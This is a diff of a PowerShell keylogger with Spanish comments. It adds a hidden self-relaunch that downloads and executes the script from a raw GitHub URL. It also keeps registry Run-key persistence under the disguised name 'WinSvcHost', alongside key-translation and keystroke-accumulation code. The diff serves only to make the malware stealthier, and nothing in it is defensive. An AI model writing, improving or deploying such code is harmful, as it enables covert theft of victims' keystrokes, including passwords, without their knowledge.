@@ -5,11 +5,18 @@ $Enlace  = 'https://raw.githubusercontent.com/adriancorreagutierrez-stack/p4wn/m
 $Minutos = 1
 $Nombre  = 'WinSvcHost'
 
-# Evita que se ejecute dos veces a la vez
+# Si la ventana esta visible, relanzarse oculto y cerrar esta
+if ($env:OCULTO -ne '1') {
+    $env:OCULTO = '1'
+    Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoP','-NonI','-C',"iex(irm '$Enlace')"
+    exit
+}
+
+# una sola instancia
 $candado = New-Object System.Threading.Mutex($false, "Local\$Nombre")
 if (-not $candado.WaitOne(0)) { exit }
 
-# Persistencia: arranca solo al iniciar sesion
+# Persistencia
 Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
     -Name $Nombre -Value "powershell -W Hidden -c iex(irm '$Enlace')" -Force
 
@@ -20,17 +27,10 @@ Add-Type -MemberDefinition @'
 [DllImport("user32.dll", CharSet=CharSet.Unicode)] public static extern int ToUnicode(uint vk, uint sc, byte[] k, [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst=64)] System.Text.StringBuilder sb, int n, uint f);
 '@ -Name Teclado -Namespace Win
 
-# Funciones para ocultar la ventana
-Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int c); [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();' -Name Ven -Namespace Win
-
 $memoria    = New-Object System.Text.StringBuilder 64
 $estado     = New-Object byte[] 256
 $pulsadas   = @{}
 $especiales = @{ 8='[BKSP]'; 9='[TAB]'; 13="`n"; 27='[ESC]'; 46='[DEL]'; 37='[<]'; 38='[^]'; 39='[>]'; 40='[v]' }
-
-# Oculta su propia ventana (al final, ya con todo compilado)
-Start-Sleep -Milliseconds 800
-[void][Win.Ven]::ShowWindow([Win.Ven]::GetConsoleWindow(), 0)
 
 $ultimoEnvio = Get-Date
 $acumulado   = ''
